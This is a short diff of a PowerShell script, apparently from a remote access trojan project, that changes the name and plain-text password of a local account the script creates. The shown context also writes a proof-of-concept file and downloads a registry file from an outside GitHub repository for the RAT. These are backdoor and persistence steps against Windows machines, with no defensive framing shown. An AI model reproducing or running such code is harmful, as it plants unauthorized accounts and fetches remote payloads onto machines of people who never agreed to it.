@@ -43,8 +43,8 @@ Set-Location $path
 # Now you can proceed with your script
 Write-Output "" > poc.txt
 
-$NewName = "jarbou3"
-$Password = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
+$NewName = "jarbouu3"
+$Password = (ConvertTo-SecureString "jarbouu3" -AsPlainText -Force)
 create_account -NewName $NewName -Password $Password
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"
